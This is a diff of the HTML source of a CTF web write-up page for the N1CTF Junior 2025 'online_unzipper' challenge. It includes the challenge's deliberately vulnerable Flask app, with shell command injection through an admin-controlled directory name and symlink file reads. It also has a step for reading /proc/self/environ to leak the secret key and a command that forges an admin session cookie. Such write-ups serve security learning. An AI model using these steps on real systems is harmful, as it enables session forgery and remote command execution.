@@ -1,611 +1,282 @@
-<!DOCTYPE html>
-<html lang="en" dir="auto">
-
-<head><meta charset="utf-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-<meta name="robots" content="index, follow">
-<title>N1CTF Junior 2025 2/2 WEB Writeup | w8nn9z Blog</title>
-<meta name="keywords" content="">
-<meta name="description" content="N1CTF Junior 2025 2/2 WEB Writeup - w8nn9z Blog">
-<meta name="author" content="">
-<link rel="canonical" href="https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/">
-
-<link crossorigin="anonymous" href="/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css" integrity="" rel="preload stylesheet" as="style">
-<link rel="icon" href="https://z9nn8w.github.io/favicon.ico">
-<link rel="icon" type="image/png" sizes="16x16" href="https://z9nn8w.github.io/favicon-16x16.png">
-<link rel="icon" type="image/png" sizes="32x32" href="https://z9nn8w.github.io/favicon-32x32.png">
-<link rel="apple-touch-icon" href="https://z9nn8w.github.io/apple-touch-icon.png">
-<link rel="mask-icon" href="https://z9nn8w.github.io/safari-pinned-tab.svg">
-<meta name="theme-color" content="#2e2e33">
-<meta name="msapplication-TileColor" content="#2e2e33">
-<link rel="alternate" hreflang="en" href="https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/">
-<noscript>
-    <style>
-        #theme-toggle,
-        .top-link {
-            display: none;
-        }
-
-    </style>
-    <style>
-        @media (prefers-color-scheme: dark) {
-            :root {
-                --theme: rgb(29, 30, 32);
-                --entry: rgb(46, 46, 51);
-                --primary: rgb(218, 218, 219);
-                --secondary: rgb(155, 156, 157);
-                --tertiary: rgb(65, 66, 68);
-                --content: rgb(196, 196, 197);
-                --code-block-bg: rgb(46, 46, 51);
-                --code-bg: rgb(55, 56, 62);
-                --border: rgb(51, 51, 51);
-            }
-
-            .list {
-                background: var(--theme);
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-track {
-                background: 0 0;
-            }
-
-            .list:not(.dark)::-webkit-scrollbar-thumb {
-                border-color: var(--theme);
-            }
-        }
-
-    </style>
-</noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/">
-  <meta property="og:site_name" content="w8nn9z Blog">
-  <meta property="og:title" content="N1CTF Junior 2025 2/2 WEB Writeup">
-  <meta property="og:locale" content="zh-cn">
-  <meta property="og:type" content="article">
-    <meta property="article:section" content="posts">
-    <meta property="article:published_time" content="2025-09-14T00:00:00+00:00">
-    <meta property="article:modified_time" content="2025-09-16T00:00:00+00:00">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="N1CTF Junior 2025 2/2 WEB Writeup">
-<meta name="twitter:description" content="">
-
-
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BreadcrumbList",
-  "itemListElement": [
-    {
-      "@type": "ListItem",
-      "position":  1 ,
-      "name": "Posts",
-      "item": "https://z9nn8w.github.io/posts/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  2 ,
-      "name": "CTF",
-      "item": "https://z9nn8w.github.io/posts/ctf/"
-    }, 
-    {
-      "@type": "ListItem",
-      "position":  3 ,
-      "name": "N1CTF Junior 2025 2/2 WEB Writeup",
-      "item": "https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/"
-    }
-  ]
-}
-</script>
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "BlogPosting",
-  "headline": "N1CTF Junior 2025 2/2 WEB Writeup",
-  "name": "N1CTF Junior 2025 2\/2 WEB Writeup",
-  "description": "",
-  "keywords": [
-    
-  ],
-  "articleBody": "online_unzipper app.py：\nimport os import uuid from flask import Flask, request, redirect, url_for,send_file,render_template, session, send_from_directory, abort, Response app = Flask(__name__) app.secret_key = os.environ.get(\"FLASK_SECRET_KEY\", \"test_key\") UPLOAD_FOLDER = os.path.join(os.getcwd(), \"uploads\") os.makedirs(UPLOAD_FOLDER, exist_ok=True) users = {} @app.route(\"/\") def index(): if \"username\" not in session: return redirect(url_for(\"login\")) return redirect(url_for(\"upload\")) @app.route(\"/register\", methods=[\"GET\", \"POST\"]) def register(): if request.method == \"POST\": username = request.form[\"username\"] password = request.form[\"password\"] if username in users: return \"用户名已存在\" users[username] = {\"password\": password, \"role\": \"user\"} return redirect(url_for(\"login\")) return render_template(\"register.html\") @app.route(\"/login\", methods=[\"GET\", \"POST\"]) def login(): if request.method == \"POST\": username = request.form[\"username\"] password = request.form[\"password\"] if username in users and users[username][\"password\"] == password: session[\"username\"] = username session[\"role\"] = users[username][\"role\"] return redirect(url_for(\"upload\")) else: return \"用户名或密码错误\" return render_template(\"login.html\") @app.route(\"/logout\") def logout(): session.clear() return redirect(url_for(\"login\")) @app.route(\"/upload\", methods=[\"GET\", \"POST\"]) def upload(): if \"username\" not in session: return redirect(url_for(\"login\")) if request.method == \"POST\": file = request.files[\"file\"] if not file: return \"未选择文件\" role = session[\"role\"] if role == \"admin\": dirname = request.form.get(\"dirname\") or str(uuid.uuid4()) else: dirname = str(uuid.uuid4()) target_dir = os.path.join(UPLOAD_FOLDER, dirname) os.makedirs(target_dir, exist_ok=True) zip_path = os.path.join(target_dir, \"upload.zip\") file.save(zip_path) try: os.system(f\"unzip -o {zip_path} -d {target_dir}\") except: return \"解压失败，请检查文件格式\" os.remove(zip_path) return f\"解压完成！\n下载地址: ",
-  "wordCount" : "2061",
-  "inLanguage": "en",
-  "datePublished": "2025-09-14T00:00:00Z",
-  "dateModified": "2025-09-16T00:00:00Z",
-  "mainEntityOfPage": {
-    "@type": "WebPage",
-    "@id": "https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/"
-  },
-  "publisher": {
-    "@type": "Organization",
-    "name": "w8nn9z Blog",
-    "logo": {
-      "@type": "ImageObject",
-      "url": "https://z9nn8w.github.io/favicon.ico"
-    }
-  }
-}
-</script>
-</head>
-
-<body class="" id="top">
-<script>
-    if (localStorage.getItem("pref-theme") === "dark") {
-        document.body.classList.add('dark');
-    } else if (localStorage.getItem("pref-theme") === "light") {
-        document.body.classList.remove('dark')
-    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
-        document.body.classList.add('dark');
-    }
-
-</script>
-
-<header class="header">
-    <nav class="nav">
-        <div class="logo">
-            <a href="https://z9nn8w.github.io/" accesskey="h" title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a>
-            <div class="logo-switches">
-                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
-                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
-                    </svg>
-                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
-                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
-                        stroke-linejoin="round">
-                        <circle cx="12" cy="12" r="5"></circle>
-                        <line x1="12" y1="1" x2="12" y2="3"></line>
-                        <line x1="12" y1="21" x2="12" y2="23"></line>
-                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
-                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
-                        <line x1="1" y1="12" x2="3" y2="12"></line>
-                        <line x1="21" y1="12" x2="23" y2="12"></line>
-                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
-                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
-                    </svg>
-                </button>
-            </div>
-        </div>
-        <ul id="menu">
-            <li>
-                <a href="https://z9nn8w.github.io/search" title="搜索 (Alt &#43; /)" accesskey=/>
-                    <span>搜索</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/posts" title="文章">
-                    <span>文章</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/archives" title="归档">
-                    <span>归档</span>
-                </a>
-            </li>
-            <li>
-                <a href="https://z9nn8w.github.io/about" title="关于">
-                    <span>关于</span>
-                </a>
-            </li>
-        </ul>
-    </nav>
-</header>
-<main class="main">
-
-<article class="post-single">
-  <header class="post-header">
-    
-    <h1 class="post-title entry-hint-parent">
-      N1CTF Junior 2025 2/2 WEB Writeup
-    </h1>
-    <div class="post-meta"><span title='2025-09-14 00:00:00 +0000 UTC'>September 14, 2025</span>
-
-</div>
-  </header> <aside id="toc-container" class="toc-container wide">
-    <div class="toc">
-        <details >
-            <summary accesskey="c" title="(Alt + C)">
-                <span class="details">Table of Contents</span>
-            </summary>
-
-            <div class="inner"><ul>
-                    <li>
-                        <a href="#online_unzipper" aria-label="online_unzipper">online_unzipper</a></li>
-                    <li>
-                        <a href="#unfinished" aria-label="Unfinished">Unfinished</a></li>
-                    <li>
-                        <a href="#ping" aria-label="ping">ping</a>
-                    </li>
-                </ul>
-            </div>
-        </details>
-    </div>
-</aside>
-<script>
-    let activeElement;
-    let elements;
-    
-    document.addEventListener('DOMContentLoaded', function (event) {
-        checkTocPosition();
-    
-        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
-        if (elements.length > 0) {
-            
-            activeElement = elements[0];
-            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
-            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
-        }
-    
-        
-        const topLink = document.getElementById('top-link');
-        if (topLink) {
-            topLink.addEventListener('click', (event) => {
-                
-                event.preventDefault();
-    
-                
-                window.scrollTo({ top: 0, behavior: 'smooth' });
-            });
-        }
-    }, false);
-    
-    window.addEventListener('resize', function(event) {
-        checkTocPosition();
-    }, false);
-    
-    window.addEventListener('scroll', () => {
-        
-        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
-    
-        
-        if (scrollPosition === 0) {
-            return;
-        }
-    
-        
-        if (elements && elements.length > 0) {
-            
-            activeElement = Array.from(elements).find((element) => {
-                if ((getOffsetTop(element) - scrollPosition) > 0 && 
-                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
-                    return element;
-                }
-            }) || activeElement;
-    
-            elements.forEach(element => {
-                const id = encodeURI(element.getAttribute('id')).toLowerCase();
-                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
-                if (element === activeElement){
-                    tocLink.classList.add('active');
-    
-                    
-                    const tocContainer = document.querySelector('.toc .inner');
-                    const linkOffsetTop = tocLink.offsetTop;
-                    const containerHeight = tocContainer.clientHeight;
-                    const linkHeight = tocLink.clientHeight;
-    
-                    
-                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
-                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
-                } else {
-                    tocLink.classList.remove('active');
-                }
-            });
-        }
-    }, false);
-    
-    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
-    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
-    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
-    
-    function checkTocPosition() {
-        const width = document.body.scrollWidth;
-    
-        if (width - main - (toc * 2) - (gap * 4) > 0) {
-            document.getElementById("toc-container").classList.add("wide");
-        } else {
-            document.getElementById("toc-container").classList.remove("wide");
-        }
-    }
-    
-    function getOffsetTop(element) {
-        if (!element.getClientRects().length) {
-            return 0;
-        }
-        let rect = element.getBoundingClientRect();
-        let win = element.ownerDocument.defaultView;
-        return rect.top + win.pageYOffset;   
-    }
-    
-</script>
-
-  <div class="post-content"><h2 id="online_unzipper">online_unzipper<a hidden class="anchor" aria-hidden="true" href="#online_unzipper">#</a></h2>
-<p>app.py：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
-</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
-</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, redirect, url_for,send_file,render_template, session, send_from_directory, abort, Response
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
-</span></span><span style="display:flex;"><span>app<span style="color:#f92672">.</span>secret_key <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;FLASK_SECRET_KEY&#34;</span>, <span style="color:#e6db74">&#34;test_key&#34;</span>)
-</span></span><span style="display:flex;"><span>UPLOAD_FOLDER <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;uploads&#34;</span>)
-</span></span><span style="display:flex;"><span>os<span style="color:#f92672">.</span>makedirs(UPLOAD_FOLDER, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>users <span style="color:#f92672">=</span> {}
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> session:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;upload&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/register&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">register</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
-</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;username&#34;</span>]
-</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;password&#34;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> users:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;用户名已存在&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        users[username] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;password&#34;</span>: password, <span style="color:#e6db74">&#34;role&#34;</span>: <span style="color:#e6db74">&#34;user&#34;</span>}
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;register.html&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/login&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">login</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
-</span></span><span style="display:flex;"><span>        username <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;username&#34;</span>]
-</span></span><span style="display:flex;"><span>        password <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form[<span style="color:#e6db74">&#34;password&#34;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> username <span style="color:#f92672">in</span> users <span style="color:#f92672">and</span> users[username][<span style="color:#e6db74">&#34;password&#34;</span>] <span style="color:#f92672">==</span> password:
-</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#34;username&#34;</span>] <span style="color:#f92672">=</span> username
-</span></span><span style="display:flex;"><span>            session[<span style="color:#e6db74">&#34;role&#34;</span>] <span style="color:#f92672">=</span> users[username][<span style="color:#e6db74">&#34;role&#34;</span>]
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;upload&#34;</span>))
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;用户名或密码错误&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;login.html&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/logout&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">logout</span>():
-</span></span><span style="display:flex;"><span>    session<span style="color:#f92672">.</span>clear()
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/upload&#34;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;GET&#34;</span>, <span style="color:#e6db74">&#34;POST&#34;</span>])
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#34;username&#34;</span> <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> session:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> redirect(url_for(<span style="color:#e6db74">&#34;login&#34;</span>))
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;POST&#34;</span>:
-</span></span><span style="display:flex;"><span>        file <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#34;file&#34;</span>]
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> file:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;未选择文件&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        role <span style="color:#f92672">=</span> session[<span style="color:#e6db74">&#34;role&#34;</span>]
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> role <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;admin&#34;</span>:
-</span></span><span style="display:flex;"><span>            dirname <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;dirname&#34;</span>) <span style="color:#f92672">or</span> str(uuid<span style="color:#f92672">.</span>uuid4())
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
-</span></span><span style="display:flex;"><span>            dirname <span style="color:#f92672">=</span> str(uuid<span style="color:#f92672">.</span>uuid4())
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        target_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_FOLDER, dirname)
-</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>makedirs(target_dir, exist_ok<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        zip_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(target_dir, <span style="color:#e6db74">&#34;upload.zip&#34;</span>)
-</span></span><span style="display:flex;"><span>        file<span style="color:#f92672">.</span>save(zip_path)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>            os<span style="color:#f92672">.</span>system(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;unzip -o </span><span style="color:#e6db74">{</span>zip_path<span style="color:#e6db74">}</span><span style="color:#e6db74"> -d </span><span style="color:#e6db74">{</span>target_dir<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;解压失败，请检查文件格式&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        os<span style="color:#f92672">.</span>remove(zip_path)
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;解压完成！&lt;br&gt;下载地址: &lt;a href=&#39;</span><span style="color:#e6db74">{</span>url_for(<span style="color:#e6db74">&#39;download&#39;</span>, folder<span style="color:#f92672">=</span>dirname)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&gt;</span><span style="color:#e6db74">{</span>request<span style="color:#f92672">.</span>host_url<span style="color:#e6db74">}</span><span style="color:#e6db74">download/</span><span style="color:#e6db74">{</span>dirname<span style="color:#e6db74">}</span><span style="color:#e6db74">&lt;/a&gt;&#34;</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;upload.html&#34;</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/download/&lt;folder&gt;&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download</span>(folder):
-</span></span><span style="display:flex;"><span>    target_dir <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_FOLDER, folder)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>exists(target_dir):
-</span></span><span style="display:flex;"><span>        abort(<span style="color:#ae81ff">404</span>)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>listdir(target_dir)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#34;download.html&#34;</span>, folder<span style="color:#f92672">=</span>folder, files<span style="color:#f92672">=</span>files)
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#34;/download/&lt;folder&gt;/&lt;filename&gt;&#34;</span>)
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download_file</span>(folder, filename):
-</span></span><span style="display:flex;"><span>    file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(UPLOAD_FOLDER, folder ,filename)
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(file_path, <span style="color:#e6db74">&#39;r&#39;</span>) <span style="color:#66d9ef">as</span> file:
-</span></span><span style="display:flex;"><span>            content <span style="color:#f92672">=</span> file<span style="color:#f92672">.</span>read()
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> Response(
-</span></span><span style="display:flex;"><span>            content,
-</span></span><span style="display:flex;"><span>            mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;application/octet-stream&#34;</span>,
-</span></span><span style="display:flex;"><span>            headers<span style="color:#f92672">=</span>{
-</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">&#34;Content-Disposition&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;attachment; filename=</span><span style="color:#e6db74">{</span>filename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
-</span></span><span style="display:flex;"><span>            }
-</span></span><span style="display:flex;"><span>        )
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">FileNotFoundError</span>:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;File not found&#34;</span>, <span style="color:#ae81ff">404</span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Error: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">500</span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
-</span></span><span style="display:flex;"><span>    app<span style="color:#f92672">.</span>run(host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>)
-</span></span></code></pre></div><p>注意到role为admin时，dirname可控，可以实现命令拼接rce，伪造flask-session需要先获取<code>app.secret_key</code>，本题是从环境变量导入的，可以利用软链接获取<code>/proc/self/environ</code>的内容：</p>
-<pre tabindex="0"><code>FLASK_SECRET_KEY=#mu0cw9F#7bBCoF!
-</code></pre><p>伪造session：</p>
-<pre tabindex="0"><code>python flask_session_cookie_manager3.py encode -s &#34;#mu0cw9F#7bBCoF!&#34; -t &#34;{&#39;role&#39;:&#39;admin&#39;,&#39;username&#39;:&#39;test&#39;}&#34;
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>N1CTF Junior 2025 2/2 WEB Writeup | w8nn9z Blog</title><meta name=keywords content><meta name=description content="N1CTF Junior 2025 2/2 WEB Writeup - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://z9nn8w.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://z9nn8w.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://z9nn8w.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://z9nn8w.github.io/apple-touch-icon.png><link rel=mask-icon href=https://z9nn8w.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://z9nn8w.github.io/posts/ctf/n1ctf-junior-2025-22-web-writeup/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="N1CTF Junior 2025 2/2 WEB Writeup"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-09-14T00:00:00+00:00"><meta property="article:modified_time" content="2025-09-16T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="N1CTF Junior 2025 2/2 WEB Writeup"><meta name=twitter:description content><script 